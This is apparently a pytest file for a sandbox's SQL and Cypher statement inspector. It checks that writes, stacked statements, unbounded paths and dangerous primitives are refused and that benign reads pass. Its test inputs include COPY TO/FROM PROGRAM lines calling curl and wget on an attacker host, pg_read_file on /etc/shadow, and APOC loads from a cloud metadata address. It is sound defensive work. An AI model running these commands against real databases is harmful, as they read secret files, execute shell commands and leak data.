"""Tests for the bounded statement inspection of `repl_sandbox.policy`.

The denials come first, because a denial that does not fire is the whole failure
mode: the role and the access mode are the primary controls, and this layer is
only worth having if it actually refuses the primitives it names.

The stripping tests matter as much as the token tests. An inspector that cannot
tell code from a comment either misses a token hidden in a literal or refuses
every query that mentions one, and both are how a proxy parser becomes the CVE.
"""

from __future__ import annotations

import pytest

from repl_sandbox.errors import DeniedError
from repl_sandbox.policy import (
    MAX_STATEMENT_CHARS,
    SQL_DENIED_TOKENS,
    ApocAllowlist,
    inspect_cypher,
    inspect_sql,
)


# ---------------------------------------------------------------------------
# Postgres denials
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("token", SQL_DENIED_TOKENS)
def test_inspect_sql_denies_every_named_primitive(token):
    with pytest.raises(DeniedError) as excinfo:
        inspect_sql(f"SELECT {token}('/etc/passwd')")
    assert token in str(excinfo.value)


def test_inspect_sql_denies_pg_read_file():
    with pytest.raises(DeniedError, match="pg_read_file"):
        inspect_sql("SELECT pg_read_file('/etc/shadow', 0, 200)")


def test_inspect_sql_denies_copy_to_program():
    with pytest.raises(DeniedError, match="PROGRAM"):
        inspect_sql("COPY (SELECT 1) TO PROGRAM 'curl http://attacker/'")


def test_inspect_sql_denies_copy_from_program():
    with pytest.raises(DeniedError, match="PROGRAM"):
        inspect_sql("COPY t FROM PROGRAM 'wget http://attacker/x'")


def test_inspect_sql_denies_copy_to_program_across_newlines():
    with pytest.raises(DeniedError, match="PROGRAM"):
        inspect_sql("COPY (SELECT 1)\n  TO\n  PROGRAM 'id'")


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO t VALUES (1)",
        "UPDATE t SET x = 1",
        "DELETE FROM t",
        "DROP TABLE t",
        "TRUNCATE t",
        "CREATE TABLE t (a int)",
        "GRANT ALL ON t TO PUBLIC",
        "DO $$ BEGIN PERFORM 1; END $$",
    ],
)
def test_inspect_sql_denies_writes(sql):
    with pytest.raises(DeniedError):
        inspect_sql(sql)


def test_inspect_sql_denies_data_modifying_cte():
    # A `WITH` head passes the statement-kind check, so the write-keyword scan is
    # the thing standing between a read grant and an insert.
    with pytest.raises(DeniedError, match="insert"):
        inspect_sql("WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x")


def test_inspect_sql_denies_select_for_update():
    with pytest.raises(DeniedError, match="update"):
        inspect_sql("SELECT * FROM t FOR UPDATE")


def test_inspect_sql_denies_stacked_statements():
    with pytest.raises(DeniedError, match="statements"):
        inspect_sql("SELECT 1; DROP TABLE t")


def test_inspect_sql_denies_explain_analyze():
    # EXPLAIN is not a read kind, because EXPLAIN ANALYZE executes its argument.
    with pytest.raises(DeniedError):
        inspect_sql("EXPLAIN ANALYZE INSERT INTO t VALUES (1)")


def test_inspect_sql_denies_unterminated_literal():
    with pytest.raises(DeniedError, match="unterminated"):
        inspect_sql("SELECT 'abc")


def test_inspect_sql_denies_unterminated_block_comment():
    with pytest.raises(DeniedError, match="unterminated"):
        inspect_sql("SELECT 1 /* pg_read_file")


def test_inspect_sql_denies_unterminated_dollar_quote():
    with pytest.raises(DeniedError, match="unterminated"):
        inspect_sql("SELECT $tag$ body")


def test_inspect_sql_denies_non_string():
    with pytest.raises(DeniedError, match="must be a string"):
        inspect_sql({"sql": "SELECT 1"})


def test_inspect_sql_is_length_bounded():
    with pytest.raises(DeniedError, match="exceeds the inspection bound"):
        inspect_sql("SELECT " + "a" * MAX_STATEMENT_CHARS)


# ---------------------------------------------------------------------------
# Postgres reads that must survive
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT id, body FROM ast_nodes WHERE id = $1",
        "select count(*) from beliefs",
        "WITH recent AS (SELECT * FROM facts) SELECT * FROM recent",
        "TABLE beliefs",
        "VALUES (1), (2)",
        "SHOW statement_timeout",
        "(SELECT 1)",
        "SELECT create_date, deleted_at FROM t",  # word-boundary, not a write
        "SELECT 1;",  # a single trailing semicolon is one statement
    ],
)
def test_inspect_sql_allows_reads(sql):
    inspect_sql(sql)


def test_inspect_sql_ignores_a_denied_token_inside_a_literal():
    inspect_sql("SELECT * FROM t WHERE note = 'dblink is a word'")


def test_inspect_sql_ignores_a_denied_token_inside_comments():
    inspect_sql("SELECT 1 -- pg_read_file\n")
    inspect_sql("SELECT /* pg_execute_server_program */ 1")


def test_inspect_sql_ignores_a_denied_token_inside_a_dollar_quote():
    inspect_sql("SELECT $tag$ lo_import $tag$")


def test_inspect_sql_handles_doubled_quotes_and_e_strings():
    inspect_sql("SELECT 'it''s fine; DROP TABLE t' AS note")
    inspect_sql(r"SELECT E'esc\' dblink' AS note")


# ---------------------------------------------------------------------------
# Cypher denials
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "query",
    [
        "MATCH (a)-[*]-(b) RETURN a",
        "MATCH (a)-[*..]-(b) RETURN a",
        "MATCH (a)-[*2..]-(b) RETURN a",
        "MATCH (a)-[r:KNOWS*]->(b) RETURN b",
    ],
)
def test_inspect_cypher_denies_unbounded_variable_length_paths(query):
    with pytest.raises(DeniedError, match="unbounded variable-length path"):
        inspect_cypher(query)


@pytest.mark.parametrize(
    "query",
    [
        "MATCH (a)-[*3]-(b) RETURN a",
        "MATCH (a)-[*1..3]-(b) RETURN a",
        "MATCH (a)-[*..5]-(b) RETURN a",
        "MATCH (a)-[r:KNOWS*1..2]->(b) RETURN b",
    ],
)
def test_inspect_cypher_allows_bounded_variable_length_paths(query):
    inspect_cypher(query)


@pytest.mark.parametrize(
    "query",
    [
        "CREATE (n:Belief {id: 1})",
        "MATCH (n) SET n.x = 1",
        "MATCH (n) DELETE n",
        "MATCH (n) DETACH DELETE n",
        "MERGE (n:Fact {id: 1})",
        "MATCH (n) REMOVE n.x",
        "DROP INDEX idx",
        "MATCH (n) FOREACH (x IN [1] | SET n.y = x)",
    ],
)
def test_inspect_cypher_denies_writes(query):
    with pytest.raises(DeniedError):
        inspect_cypher(query)


def test_inspect_cypher_denies_load_csv():
    with pytest.raises(DeniedError, match="LOAD CSV"):
        inspect_cypher("LOAD CSV FROM 'http://attacker/x.csv' AS row RETURN row")


def test_inspect_cypher_denies_stacked_statements():
    with pytest.raises(DeniedError, match="statements"):
        inspect_cypher("MATCH (n) RETURN n; MATCH (m) DELETE m")


def test_inspect_cypher_denies_unterminated_string():
    with pytest.raises(DeniedError, match="unterminated"):
        inspect_cypher("MATCH (n) WHERE n.x = 'abc RETURN n")


@pytest.mark.parametrize(
    "query",
    [
        "MATCH (n:Belief) RETURN n LIMIT 10",
        "MATCH (n) RETURN count(*)",
        "RETURN 6 * 7 AS answer",
        "MATCH (n) RETURN n.tags[0]",
        "MATCH (n) WHERE n.note = 'CREATE is only a word here' RETURN n",
        "// DELETE\nMATCH (n) RETURN n",
    ],
)
def test_inspect_cypher_allows_reads(query):
    inspect_cypher(query)


# ---------------------------------------------------------------------------
# APOC allowlist
# ---------------------------------------------------------------------------


def test_apoc_allowlist_is_deny_by_default():
    allowlist = ApocAllowlist()
    with pytest.raises(DeniedError, match="apoc.load.json"):
        allowlist.check("CALL apoc.load.json('http://169.254.169.254/') YIELD value RETURN value")


def test_apoc_allowlist_denies_export_by_default():
    with pytest.raises(DeniedError, match="apoc.export.csv.all"):
        ApocAllowlist().check("CALL apoc.export.csv.all('/tmp/out.csv', {})")


def test_apoc_allowlist_denies_anything_not_named():
    allowlist = ApocAllowlist(frozenset({"apoc.meta.stats"}))
    allowlist.check("CALL apoc.meta.stats() YIELD labels RETURN labels")
    with pytest.raises(DeniedError, match="apoc.load.json"):
        allowlist.check("CALL apoc.load.json('http://attacker/') YIELD value RETURN value")


def test_apoc_allowlist_is_case_insensitive():
    allowlist = ApocAllowlist(frozenset({"APOC.Meta.Stats"}))
    allowlist.check("CALL apoc.meta.stats()")
    with pytest.raises(DeniedError):
        ApocAllowlist().check("CALL APOC.LOAD.JSON('http://attacker/')")


def test_apoc_allowlist_supports_a_reviewed_namespace_wildcard():
    allowlist = ApocAllowlist(frozenset({"apoc.coll.*"}))
    allowlist.check("RETURN apoc.coll.sort([3, 1, 2])")
    with pytest.raises(DeniedError):
        allowlist.check("CALL apoc.load.json('http://attacker/')")


def test_apoc_allowlist_ignores_a_reference_inside_a_literal():
    ApocAllowlist().check("MATCH (n) WHERE n.note = 'apoc.load.json' RETURN n")


def test_apoc_allowlist_ignores_a_reference_inside_a_comment():
    ApocAllowlist().check("MATCH (n) RETURN n // apoc.export.csv.all")
